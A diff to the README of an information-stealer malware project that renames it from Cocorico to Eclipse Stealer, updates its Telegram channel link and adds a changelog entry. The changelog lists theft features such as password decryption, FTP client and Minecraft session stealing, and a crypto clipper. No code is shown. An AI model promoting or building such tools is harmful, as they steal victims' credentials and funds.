@@ -1,4 +1,4 @@
-🐔 Cocorico Stealer V1.2 !
+🧬 Eclipse Stealer V1.2 !
 -----
 
 <p>
@@ -6,7 +6,7 @@
 </p>
 
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-<a href="https://t.me/cocoricostealer">
+<a href="https://t.me/eclipsestealer">
   <img src="https://img.shields.io/badge/telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white">
 </a>
 
@@ -122,6 +122,7 @@
 - V1.2.7 Changed README file format
 - V1.2.8 Added Gecko Password Decryption (Not Working) and WinSCP (Updated), Removed Growtopia, Updated Games, Filezilla and Telegram Embed
 - V1.2.9 Added Minecraft Session Stealer & Crypto Clipper
+- V1.3.0 Changed Stealer Name to Eclipse
 ```
 
 👤 Author
